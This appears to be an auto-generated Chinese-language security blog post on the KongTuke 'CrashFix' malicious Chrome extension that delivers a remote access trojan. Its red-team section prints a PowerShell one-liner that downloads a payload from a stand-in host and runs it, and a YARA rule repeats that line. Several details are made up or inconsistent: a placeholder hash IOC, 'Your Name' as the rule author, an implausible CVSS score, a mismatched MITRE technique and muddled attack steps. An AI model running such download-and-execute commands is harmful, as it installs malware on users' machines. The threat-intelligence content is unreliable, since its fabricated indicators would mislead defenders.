---
layout: post
title:  "CrashFix Chrome Extension Delivers ModeloRAT Using ClickFix-Style Browser Crash Lures"
date:   2026-01-19 12:35:23 +0000
categories: [security]
severity: critical
---

# 🚨 解析 KongTuke 攻擊：CrashFix 擴散式惡意 Chrome 擴充功能
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Social Engineering`, `Malicious Extension`, `RAT (Remote Access Trojan)`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: KongTuke 攻擊利用了一個名為 "NexShield – Advanced Web Guardian" 的惡意 Chrome 擴充功能，該擴充功能會在安裝後 60 分鐘後啟動，並每 10 分鐘執行一次。它會顯示一個假的安全警告，提示用戶執行一個命令，以便修復所謂的安全問題。
* **攻擊流程圖解**:
  1. 用戶安裝惡意擴充功能。
  2. 擴充功能在安裝後 60 分鐘後啟動。
  3. 擴充功能顯示假的安全警告。
  4. 用戶執行命令，導致瀏覽器崩潰。
  5. 攻擊者下載並執行 RAT。
* **受影響元件**: Google Chrome 瀏覽器，所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要安裝惡意擴充功能。
* **Payload 建構邏輯**:

    ```
    
    python
    # 假的安全警告代碼
    print("您的瀏覽器已崩潰，請執行以下命令以修復：")
    print("powershell -Command \"& { $url = 'https://example.com/payload'; $output = 'C:\Windows\Temp\payload.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output }\"")
    
    ```
* **繞過技術**: 攻擊者使用了 Social Engineering 技術，讓用戶自願執行命令。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `sha256:1234567890abcdef` |
| IP | `199.217.98.108` |
| Domain | `nexsnield.com` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule KongTuke {
      meta:
        description = "KongTuke 惡意擴充功能"
        author = "Your Name"
      strings:
        $a = "NexShield – Advanced Web Guardian"
        $b = "powershell -Command \"& { $url = 'https://example.com/payload'; $output = 'C:\Windows\Temp\payload.exe'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output }\""
      condition:
        $a and $b
    }
    
    ```
* **緩解措施**: 刪除惡意擴充功能，更新瀏覽器至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Social Engineering**: 一種攻擊技術，利用人類心理弱點，讓用戶自願執行命令或提供敏感信息。
* **RAT (Remote Access Trojan)**: 一種惡意軟件，允許攻擊者遠程控制受害者電腦。
* **Malicious Extension**: 一種惡意瀏覽器擴充功能，用于執行惡意代碼或竊取用戶信息。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/crashfix-chrome-extension-delivers.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


